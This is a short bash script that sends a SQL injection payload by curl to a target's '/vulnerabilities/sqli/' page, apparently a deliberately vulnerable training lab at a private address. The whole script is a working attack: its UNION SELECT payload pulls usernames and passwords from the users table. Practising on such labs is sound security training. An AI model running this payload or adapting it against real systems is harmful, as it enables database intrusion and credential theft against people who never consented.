#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-172.21.0.20}"
PAYLOAD="1' UNION SELECT user,password FROM users-- -"
curl -fsS "http://$TARGET/vulnerabilities/sqli/?id=${PAYLOAD// /+}&Submit=Submit"
